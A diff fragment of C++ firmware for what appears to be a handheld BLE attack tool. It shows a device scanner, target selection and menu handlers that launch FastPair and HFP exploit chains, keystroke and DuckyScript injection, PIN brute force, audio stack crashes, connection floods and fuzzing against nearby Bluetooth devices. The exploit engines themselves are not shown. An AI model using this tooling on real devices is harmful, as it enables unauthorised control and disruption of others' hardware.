     const int ACTIVE_SCAN_TIME = 15;
     const int PASSIVE_SCAN_TIME = 15;
-
     tft.setCursor(20, 120);
     tft.print("Active scan (15s)...");
-
     bool scanCancelled = false;
     unsigned long scanStart = millis();
-
-#ifdef NIMBLE_V2_PLUS
     pBLEScan->start(ACTIVE_SCAN_TIME, false);
-#else
-    NimBLEScanResults results = pBLEScan->start(ACTIVE_SCAN_TIME, false);
-#endif
-
     while(millis() - scanStart < ACTIVE_SCAN_TIME * 1000) {
         if(check(EscPress) || check(PrevPress)) {
             pBLEScan->stop();
@@ -3738,29 +3212,17 @@ String selectTargetFromScan(const char* title) {
         }
         delay(100);
     }
-
-#ifdef NIMBLE_V2_PLUS
     pBLEScan->stop();
     NimBLEScanResults results = pBLEScan->getResults();
-#endif
-
     if(scanCancelled) {
         BLEStateManager::deinitBLE(true);
         return "";
     }
-
     tft.setCursor(20, 140);
     tft.print("Passive scan (15s)...");
     pBLEScan->setActiveScan(false);
-
     scanStart = millis();
-
-#ifdef NIMBLE_V2_PLUS
     pBLEScan->start(PASSIVE_SCAN_TIME, false);
-#else
-    results = pBLEScan->start(PASSIVE_SCAN_TIME, false);
-#endif
-
     while(millis() - scanStart < PASSIVE_SCAN_TIME * 1000) {
         if(check(EscPress) || check(PrevPress)) {
             pBLEScan->stop();
@@ -3771,28 +3233,22 @@ String selectTargetFromScan(const char* title) {
         }
         delay(100);
     }
-
     if(scanCancelled) {
         BLEStateManager::deinitBLE(true);
         return "";
     }
-
     for(int i = 0; i < results.getCount(); i++) {
         const NimBLEAdvertisedDevice* device = results.getDevice(i);
-
         String address = String(device->getAddress().toString().c_str());
         String name = String(device->getName().c_str());
         if(name.isEmpty() || name == "(null)" || name == "null" || name == "NULL") {
             name = "Unknown";
         }
-
         int rssi = device->getRSSI();
         if(rssi == 0) rssi = -100;
-
         bool fastPair = false;
         bool hasHFP = false;
         uint8_t deviceType = 0;
-
         if(device->haveServiceUUID()) {
             NimBLEUUID uuid = device->getServiceUUID();
             std::string uuidStr = uuid.toString();
@@ -3801,31 +3257,24 @@ String selectTargetFromScan(const char* title) {
             if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) deviceType |= 0x01;
             if(uuidStr.find("1812") != std::string::npos) deviceType |= 0x02;
         }
-
         scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType);
     }
-
     pBLEScan->stop();
     pBLEScan->clearResults();
-
     size_t deviceCount = scannerData.size();
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size() - 1; i++) {
             for(size_t j = i + 1; j < scannerData.deviceAddresses.size(); j++) {
                 bool swapNeeded = false;
                 if(scannerData.deviceFastPair[j] && !scannerData.deviceFastPair[i]) swapNeeded = true;
                 else if(scannerData.deviceFastPair[j] == scannerData.deviceFastPair[i] && scannerData.deviceRssi[j] > scannerData.deviceRssi[i]) swapNeeded = true;
-
                 if(swapNeeded) {
                     std::swap(scannerData.deviceNames[i], scannerData.deviceNames[j]);
                     std::swap(scannerData.deviceAddresses[i], scannerData.deviceAddresses[j]);
                     std::swap(scannerData.deviceRssi[i], scannerData.deviceRssi[j]);
-
                     bool tempFastPair = scannerData.deviceFastPair[i];
                     scannerData.deviceFastPair[i] = scannerData.deviceFastPair[j];
                     scannerData.deviceFastPair[j] = tempFastPair;
-
                     bool tempHFP = scannerData.deviceHasHFP[i];
                     scannerData.deviceHasHFP[i] = scannerData.deviceHasHFP[j];
                     scannerData.deviceHasHFP[j] = tempHFP;
@@ -3835,30 +3284,25 @@ String selectTargetFromScan(const char* title) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     int maxVisibleDevices = 3;
     int deviceItemHeight = 30;
     int menuStartY = 60;
     int selectedIdx = 0;
     int scrollOffset = 0;
     bool exitLoop = false;
-
     while(!exitLoop) {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("SELECT DEVICE") * 12) / 2, 15);
         tft.print("SELECT DEVICE");
         tft.setTextSize(1);
-
         tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
         tft.setCursor(20, 40);
         tft.print("Found: ");
         tft.print(deviceCount);
         tft.print(" devices");
-
         for(int i = 0; i < maxVisibleDevices && (scrollOffset + i) < deviceCount; i++) {
             String displayName;
             String address;
@@ -3866,7 +3310,6 @@ String selectTargetFromScan(const char* title) {
             bool fastPair = false;
             bool hasHFP = false;
             uint8_t deviceType = 0;
-
             if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
                 int deviceIndex = scrollOffset + i;
                 if(deviceIndex < scannerData.deviceNames.size()) {
@@ -3879,9 +3322,7 @@ String selectTargetFromScan(const char* title) {
                 }
                 xSemaphoreGive(scannerData.mutex);
             }
-
             if(displayName.isEmpty()) continue;
-
             String displayText = displayName;
             if(displayText.length() > 18) displayText = displayText.substring(0, 15) + "...";
             displayText += " (" + String(rssi) + "dB)";
@@ -3889,10 +3330,8 @@ String selectTargetFromScan(const char* title) {
             if(hasHFP) displayText += " [HFP]";
             if(deviceType & 0x01) displayText += " [AUDIO]";
             if(deviceType & 0x02) displayText += " [HID]";
-
             int yPos = menuStartY + (i * deviceItemHeight);
             if(yPos + deviceItemHeight > tftHeight - 45) break;
-
             if(i == selectedIdx - scrollOffset) {
                 tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, TFT_WHITE);
                 tft.setTextColor(TFT_BLACK, TFT_WHITE);
@@ -3906,7 +3345,6 @@ String selectTargetFromScan(const char* title) {
             }
             tft.print(displayText);
         }
-
         if(deviceCount > maxVisibleDevices) {
             tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
             tft.setCursor(tftWidth - 25, menuStartY + 10);
@@ -3914,11 +3352,9 @@ String selectTargetFromScan(const char* title) {
             tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleDevices * deviceItemHeight) - 15);
             if(scrollOffset + maxVisibleDevices < deviceCount) tft.print("v");
         }
-
         tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
         bool gotInput = false;
         while(!gotInput) {
             if(check(EscPress)) {
@@ -3947,7 +3383,6 @@ String selectTargetFromScan(const char* title) {
             } else if(check(SelPress)) {
                 String selectedMAC = "";
                 String selectedName = "";
-
                 if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
                     if(selectedIdx < scannerData.deviceAddresses.size()) {
                         selectedMAC = scannerData.deviceAddresses[selectedIdx];
@@ -3955,7 +3390,6 @@ String selectTargetFromScan(const char* title) {
                     }
                     xSemaphoreGive(scannerData.mutex);
                 }
-
                 if(!selectedMAC.isEmpty()) {
                     BLEStateManager::deinitBLE(true);
                     scannerData.clear();
@@ -3966,7 +3400,6 @@ String selectTargetFromScan(const char* title) {
             if(!gotInput) delay(50);
         }
     }
-
     BLEStateManager::deinitBLE(true);
     scannerData.clear();
     return "";
@@ -3977,13 +3410,10 @@ void BleSuiteMenu() {
     if(targetInfo.isEmpty()) return;
     NimBLEAddress target = parseAddress(targetInfo);
     if(!requireSimpleConfirmation("Attack this device?")) return;
-
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackMenuWithTarget(target);
-
     cleanup.disable();
 }
 
@@ -4026,7 +3456,6 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
         "FastPair All Exploits",
         "FastPair → HID Chain Attack"
     };
-
     int selectedAttack = 0;
     int scrollOffset = 0;
     bool exitMenu = false;
@@ -4034,29 +3463,24 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
     int menuItemHeight = 25;
     int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
     if(maxVisibleItems > MAX_ATTACKS) maxVisibleItems = MAX_ATTACKS;
-
     while(!exitMenu) {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("BLE SUITE") * 12) / 2, 15);
         tft.print("BLE SUITE");
         tft.setTextSize(1);
-
         tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
         tft.setCursor(20, 40);
         tft.print("Target: ");
         String targetStr = target.toString().c_str();
         if(targetStr.length() > 22) targetStr = targetStr.substring(0, 19) + "...";
         tft.println(targetStr);
-
         for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < MAX_ATTACKS; i++) {
             int attackIdx = scrollOffset + i;
             int yPos = menuStartY + (i * menuItemHeight);
             if(yPos + menuItemHeight > tftHeight - 45) break;
-
             if(attackIdx == selectedAttack) {
                 tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
                 tft.setTextColor(TFT_BLACK, TFT_WHITE);
@@ -4068,12 +3492,10 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
                 tft.setCursor(25, yPos + 8);
                 tft.print("  ");
             }
-
             String displayName = attackNames[attackIdx];
             if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
             tft.print(displayName);
         }
-
         if(MAX_ATTACKS > maxVisibleItems) {
             tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
             tft.setCursor(tftWidth - 25, menuStartY + 5);
@@ -4081,11 +3503,9 @@ void showAttackMenuWithTarget(NimBLEAddress target) {
             tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
             if(scrollOffset + maxVisibleItems < MAX_ATTACKS) tft.print("v");
         }
-
         tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
         bool inputProcessed = false;
         while(!inputProcessed) {
             if(check(EscPress)) {
@@ -4167,14 +3587,11 @@ void runUniversalAttack(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Execute universal attack chain (HFP + HID + FastPair)?")) return;
-
     String deviceName = "";
     int rssi = -60;
     bool hasHFP = false;
     bool hasFastPair = false;
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -4187,23 +3604,19 @@ void runUniversalAttack(NimBLEAddress target) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     std::vector<String> lines;
     lines.push_back("UNIVERSAL ATTACK CHAIN");
     lines.push_back("Device: " + deviceName);
     lines.push_back("HFP: " + String(hasHFP ? "YES" : "NO"));
     lines.push_back("FastPair: " + String(hasFastPair ? "YES" : "NO"));
-
     bool hfpSuccess = false;
     bool fpSuccess = false;
     bool hidSuccess = false;
-
     if(hasHFP) {
         showAttackProgress("Phase 1: Testing HFP vulnerability...", TFT_CYAN);
         HFPExploitEngine hfp;
         hfpSuccess = hfp.executeHFPAttackChain(target);
         lines.push_back("HFP Attack: " + String(hfpSuccess ? "SUCCESS" : "FAILED"));
-
         if(hfpSuccess) {
             showAttackProgress("HFP success! Phase 2: HID injection...", TFT_GREEN);
             HIDAttackServiceClass hidAttack;
@@ -4211,19 +3624,15 @@ void runUniversalAttack(NimBLEAddress target) {
             lines.push_back("HID Injection: " + String(hidSuccess ? "SUCCESS" : "FAILED"));
         }
     }
-
     if(hasFastPair && (!hfpSuccess || !hidSuccess)) {
         showAttackProgress("Phase 3: Testing FastPair vulnerability...", TFT_BLUE);
         WhisperPairExploit exploit;
         fpSuccess = exploit.executeSilent(target);
         lines.push_back("FastPair Attack: " + String(fpSuccess ? "SUCCESS" : "FAILED"));
     }
-
     lines.push_back("");
     lines.push_back("Attack chain completed");
-
     cleanup.disable();
-
     if(hfpSuccess || fpSuccess || hidSuccess) {
         showDeviceInfoScreen("ATTACK SUCCESS", lines, TFT_GREEN, TFT_BLACK);
     } else {
@@ -4235,9 +3644,7 @@ void runWhisperPairAttack(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     bool hasHFP = false;
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -4247,7 +3654,6 @@ void runWhisperPairAttack(NimBLEAddress target) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     if(hasHFP) {
         showAttackProgress("Device has HFP, testing first...", TFT_CYAN);
         HFPExploitEngine hfp;
@@ -4257,7 +3663,6 @@ void runWhisperPairAttack(NimBLEAddress target) {
                                             "Direct FastPair attack", 
                                             "Cancel", 
                                             TFT_ORANGE, true, false);
-
             if(choice == 0) {
                 if(hfp.executeHFPAttackChain(target)) {
                     showAttackProgress("HFP successful! Now trying FastPair...", TFT_GREEN);
@@ -4266,10 +3671,8 @@ void runWhisperPairAttack(NimBLEAddress target) {
             if(choice == -1) return;
         }
     }
-
     WhisperPairExploit exploit;
     exploit.execute(target);
-
     cleanup.disable();
 }
 
@@ -4277,35 +3680,28 @@ void runAdvancedExploit(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen("ADVANCED EXPLOIT") * 12) / 2, 15);
     tft.print("ADVANCED EXPLOIT");
     tft.setTextSize(1);
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, 60);
     tft.println("Select Attack Type:");
-
     const char* attackTypes[] = {
         "Protocol State Confusion",
         "Crypto Overflow",
         "Handshake Only",
         "All Attacks"
     };
-
     int selectedType = 0;
     bool exitSubmenu = false;
-
     while(!exitSubmenu) {
         for(int i = 0; i < 4; i++) {
             int yPos = 90 + (i * 35);
             if(yPos + 30 > tftHeight - 45) break;
-
             if(i == selectedType) {
                 tft.fillRoundRect(30, yPos, tftWidth - 60, 30, 5, TFT_WHITE);
                 tft.setTextColor(TFT_BLACK, TFT_WHITE);
@@ -4319,11 +3715,9 @@ void runAdvancedExploit(NimBLEAddress target) {
             }
             tft.print(attackTypes[i]);
         }
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Execute  PREV/NEXT: Navigate  ESC: Back");
-
         bool inputProcessed = false;
         while(!inputProcessed) {
             if(check(EscPress)) {
@@ -4343,9 +3737,7 @@ void runAdvancedExploit(NimBLEAddress target) {
                 } else {
                     result = exploit.executeAdvanced(target, selectedType);
                 }
-
                 cleanup.disable();
-
                 if(result) {
                     showAttackResult(true, "Advanced attack successful!");
                 } else {
@@ -4363,30 +3755,23 @@ void runAudioStackCrash(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Crash audio stack?")) return;
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Connected! Attacking audio stack...", TFT_GREEN);
     AudioAttackService audioAttack;
     bool result = audioAttack.crashAudioStack(target);
-
     std::vector<String> lines;
     lines.push_back("AUDIO STACK CRASH ATTACK");
     lines.push_back("Connection: " + connectionMethod);
     lines.push_back("Result: " + String(result ? "SUCCESS" : "FAILED"));
     lines.push_back("");
-
     cleanup.disable();
-
     if(result) {
         lines.push_back("Audio stack crash commands");
         lines.push_back("were successfully sent!");
@@ -4402,30 +3787,23 @@ void runMediaCommandHijack(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Inject media commands?")) return;
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Connected! Injecting media commands...", TFT_GREEN);
     AudioAttackService audioAttack;
     bool result = audioAttack.injectMediaCommands(target);
-
     std::vector<String> lines;
     lines.push_back("MEDIA COMMAND HIJACK");
     lines.push_back("Connection: " + connectionMethod);
     lines.push_back("Result: " + String(result ? "SUCCESS" : "FAILED"));
     lines.push_back("");
-
     cleanup.disable();
-
     if(result) {
         lines.push_back("Media control commands");
         lines.push_back("were successfully sent!");
@@ -4441,11 +3819,9 @@ void runHIDInjection(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String deviceName = "";
     int rssi = -60;
     bool hasHFP = false;
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -4457,14 +3833,12 @@ void runHIDInjection(NimBLEAddress target) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     if(hasHFP && deviceName.length() > 0) {
         int choice = showAdaptiveMessage("Device has HFP service", 
                                         "Try HFP pivot first", 
                                         "Direct HID attack", 
                                         "Cancel", 
                                         TFT_YELLOW, true, false);
-
         if(choice == 0) {
             HFPExploitEngine hfp;
             if(hfp.executeHFPAttackChain(target)) {
@@ -4485,12 +3859,9 @@ void runHIDInjection(NimBLEAddress target) {
         }
         if(choice == -1) return;
     }
-
     HIDAttackServiceClass hidAttack;
     bool result = hidAttack.injectKeystrokes(target);
-
     cleanup.disable();
-
     if(result) showAttackResult(true, "HID keystrokes attempted!");
     else showAttackResult(false, "HID injection failed");
 }
@@ -4499,11 +3870,9 @@ void runDuckyScriptAttack(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String deviceName = "";
     int rssi = -60;
     bool hasHFP = false;
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -4515,17 +3884,14 @@ void runDuckyScriptAttack(NimBLEAddress target) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     String script = getScriptFromUser();
     if(script.isEmpty()) return;
-
     if(hasHFP && deviceName.length() > 0) {
         int choice = showAdaptiveMessage("Device has HFP service", 
                                         "HFP pivot first", 
                                         "Direct injection", 
                                         "Cancel", 
                                         TFT_YELLOW, true, false);
-
         if(choice == 0) {
             HFPExploitEngine hfp;
             if(hfp.executeHFPAttackChain(target)) {
@@ -4543,10 +3909,8 @@ void runDuckyScriptAttack(NimBLEAddress target) {
         }
         if(choice == -1) return;
     }
-
     HIDDuckyService duckyService;
     duckyService.injectDuckyScript(target, script);
-
     cleanup.disable();
 }
 
@@ -4554,10 +3918,8 @@ void runPINBruteForce(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     PairingAttackServiceClass pairingAttack;
     pairingAttack.bruteForcePIN(target);
-
     cleanup.disable();
 }
 
@@ -4565,10 +3927,8 @@ void runConnectionFlood(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     DoSAttackServiceClass dosAttack;
     dosAttack.connectionFlood(target);
-
     cleanup.disable();
 }
 
@@ -4576,10 +3936,8 @@ void runAdvertisingSpam(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     DoSAttackServiceClass dosAttack;
     dosAttack.advertisingSpam(target);
-
     cleanup.disable();
 }
 
@@ -4587,11 +3945,8 @@ void runQuickTest(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     showAttackProgress("Quick testing (HFP + FastPair)...", TFT_WHITE);
-
     bool hasHFP = false;
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -4601,9 +3956,7 @@ void runQuickTest(NimBLEAddress target) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     std::vector<String> results;
-
     if(hasHFP) {
         HFPExploitEngine hfp;
         bool hfpVulnerable = hfp.testCVE202536911(target);
@@ -4611,24 +3964,18 @@ void runQuickTest(NimBLEAddress target) {
     } else {
         results.push_back("HFP: Not detected");
     }
-
     WhisperPairExploit exploit;
     bool fpVulnerable = exploit.executeSilent(target);
     results.push_back("FastPair: " + String(fpVulnerable ? "VULNERABLE" : "SAFE"));
-
     std::vector<String> lines;
     lines.push_back("QUICK VULNERABILITY TEST");
     lines.push_back("Target: " + String(target.toString().c_str()));
-
     for(auto& result : results) {
         lines.push_back(result);
     }
-
     lines.push_back("");
     lines.push_back("Test completed");
-
     cleanup.disable();
-
     if(hasHFP && results[0].indexOf("VULNERABLE") != -1) {
         lines.push_back("Try HFP-based attacks first!");
         showDeviceInfoScreen("VULNERABLE DEVICE", lines, TFT_ORANGE, TFT_BLACK);
@@ -4643,18 +3990,14 @@ void runDeviceProfiling(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Profile device services?")) return;
     showAttackProgress("Profiling device...", TFT_WHITE);
-
     BLEAttackManager bleManager;
     DeviceProfile profile = bleManager.profileDevice(target);
-
     std::vector<String> lines;
     lines.push_back("DEVICE PROFILE REPORT");
     lines.push_back("Address: " + profile.address);
     lines.push_back("Connected: " + String(profile.connected ? "YES" : "NO"));
-
     if(profile.connected) {
         lines.push_back("Services found: " + String(profile.services.size()));
         lines.push_back("FastPair: " + String(profile.hasFastPair ? "YES" : "NO"));
@@ -4662,7 +4005,6 @@ void runDeviceProfiling(NimBLEAddress target) {
         lines.push_back("HID: " + String(profile.hasHID ? "YES" : "NO"));
         lines.push_back("Battery: " + String(profile.hasBattery ? "YES" : "NO"));
         lines.push_back("Device Info: " + String(profile.hasDeviceInfo ? "YES" : "NO"));
-
         int writableCount = 0;
         for(auto& ch : profile.characteristics) 
             if(ch.canWrite) writableCount++;
@@ -4670,7 +4012,6 @@ void runDeviceProfiling(NimBLEAddress target) {
     } else {
         lines.push_back("Failed to connect for profiling");
     }
-
     cleanup.disable();
     showDeviceInfoScreen("DEVICE PROFILE", lines, TFT_BLUE, TFT_WHITE);
 }
@@ -4679,21 +4020,16 @@ void runWriteAccessTest(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Test write access on all characteristics?")) return;
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Connected! Testing write access...", TFT_GREEN);
     std::vector<String> writeableChars;
-
     const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
     for(auto& service : services) {
         const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
@@ -4708,24 +4044,19 @@ void runWriteAccessTest(NimBLEAddress target) {
             }
         }
     }
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     cleanup.disable();
-
     if(!writeableChars.empty()) {
         std::vector<String> lines;
         lines.push_back("WRITABLE CHARACTERISTICS:");
         lines.push_back("Connection: " + connectionMethod);
         lines.push_back("Found: " + String(writeableChars.size()));
-
         for(int i = 0; i < std::min(5, (int)writeableChars.size()); i++) 
             lines.push_back(writeableChars[i]);
-
         if(writeableChars.size() > 5) 
             lines.push_back("... and " + String(writeableChars.size() - 5) + " more");
-
         showDeviceInfoScreen("WRITE ACCESS TEST", lines, TFT_BLUE, TFT_WHITE);
     } else {
         showAttackResult(false, "No writable characteristics found");
@@ -4736,18 +4067,14 @@ void runProtocolFuzzer(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Fuzz BLE protocol with random data?")) return;
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Connected! Fuzzing protocol...", TFT_GREEN);
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
@@ -4757,13 +4084,11 @@ void runProtocolFuzzer(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return;
     }
-
     NimBLERemoteCharacteristic* pChar = nullptr;
     const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics(true);
     for(auto& ch : chars) {
         if(ch->canWrite()) { pChar = ch; break; }
     }
-
     if(!pChar) {
         showAttackResult(false, "No writable characteristic");
         pClient->disconnect();
@@ -4771,7 +4096,6 @@ void runProtocolFuzzer(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
         return;
     }
-
     bool anySent = false;
     for(int i = 0; i < 10; i++) {
         uint8_t fuzzPacket[64];
@@ -4785,12 +4109,10 @@ void runProtocolFuzzer(NimBLEAddress target) {
         if(sent) anySent = true;
         delay(100);
     }
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     cleanup.disable();
-
     if(anySent) showAttackResult(true, "Fuzzing completed!");
     else showAttackResult(false, "Fuzzing failed");
 }
@@ -4799,10 +4121,8 @@ void runJamConnectAttack(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     MultiConnectionAttack attack;
     attack.jamAndConnect(target);
-
     cleanup.disable();
 }
 
@@ -4810,32 +4130,25 @@ void runHIDTest(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Test HID (Keyboard/Mouse) capabilities?")) return;
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return;
     }
-
     BLEStateManager::registerClient(pClient);
-
     showAttackProgress("Connected! Testing HID services...", TFT_GREEN);
     std::vector<String> hidServices;
-
     const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
     for(auto& service : services) {
         NimBLEUUID uuid = service->getUUID();
         std::string uuidStdStr = uuid.toString();
         String uuidStr = String(uuidStdStr.c_str());
-
         if(uuidStr.indexOf("1812") != -1 || uuidStr.indexOf("1813") != -1 || uuidStr.indexOf("1814") != -1 || 
            uuidStr.indexOf("2a4a") != -1 || uuidStr.indexOf("2a4b") != -1 || uuidStr.indexOf("2a4d") != -1) {
             hidServices.push_back(uuidStr + " - HID Service");
         }
-
         const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
         for(auto& ch : chars) {
             std::string charUuidStdStr = ch->getUUID().toString();
@@ -4845,23 +4158,18 @@ void runHIDTest(NimBLEAddress target) {
             }
         }
     }
-
     pClient->disconnect();
     BLEStateManager::unregisterClient(pClient);
     NimBLEDevice::deleteClient(pClient);
     cleanup.disable();
-
     if(!hidServices.empty()) {
         std::vector<String> lines;
         lines.push_back("HID SERVICES FOUND:");
         lines.push_back("Connection: " + connectionMethod);
-
         for(int i = 0; i < std::min(6, (int)hidServices.size()); i++) 
             lines.push_back(hidServices[i]);
-
         if(hidServices.size() > 6) 
             lines.push_back("... and " + String(hidServices.size() - 6) + " more");
-
         showDeviceInfoScreen("HID TEST RESULTS", lines, TFT_DARKGREEN, TFT_WHITE);
     } else {
         showAttackResult(false, "No HID services found");
@@ -4872,7 +4180,6 @@ void runAudioControlTest(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     const int AUDIO_TESTS = 4;
     const char* audioTestNames[] = {
         "Test AVRCP Service",
@@ -4880,32 +4187,25 @@ void runAudioControlTest(NimBLEAddress target) {
         "Test Telephony",
         "Test All Audio"
     };
-
     int selectedTest = 0;
     bool exitSubmenu = false;
-
     while(!exitSubmenu) {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("AUDIO CONTROL TEST") * 12) / 2, 15);
         tft.print("AUDIO CONTROL TEST");
         tft.setTextSize(1);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setCursor(20, 60);
         tft.println("Select Audio Test:");
-
         int maxTests = std::min(AUDIO_TESTS, 5);
         int testHeight = 35;
         int startY = 90;
-
         for(int i = 0; i < maxTests; i++) {
             int yPos = startY + (i * testHeight);
             if(yPos + testHeight > tftHeight - 45) break;
-
             if(i == selectedTest) {
                 tft.fillRoundRect(30, yPos, tftWidth - 60, testHeight - 5, 5, TFT_WHITE);
                 tft.setTextColor(TFT_BLACK, TFT_WHITE);
